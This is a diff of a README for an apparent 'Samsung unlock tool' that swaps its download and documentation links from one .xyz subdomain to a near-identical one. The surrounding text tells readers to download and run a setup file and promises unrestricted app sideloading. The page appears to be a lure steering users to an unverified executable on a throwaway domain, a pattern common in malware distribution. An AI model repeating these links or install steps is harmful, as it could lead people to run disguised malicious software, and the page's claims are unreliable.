@@ -24,8 +24,8 @@ No extra dependencies — download and run.
 3. Run the setup file and follow the on-screen instructions.
 
 ## Get the app
-- 📥 **Grab the latest version:** [https://samsung-unlock-tool-spark.softonx.xyz](https://samsung-unlock-tool-spark.softonx.xyz)
-- 📖 **Docs & guides:** [https://samsung-unlock-tool-spark.softonx.xyz](https://samsung-unlock-tool-spark.softonx.xyz)
+- 📥 **Grab the latest version:** [https://samsung-unlock-tool-spark.softax.xyz](https://samsung-unlock-tool-spark.softax.xyz)
+- 📖 **Docs & guides:** [https://samsung-unlock-tool-spark.softax.xyz](https://samsung-unlock-tool-spark.softax.xyz)
 
 ## Features
 - ✅ **App Sideloading:** Install applications from external sources without restrictions.
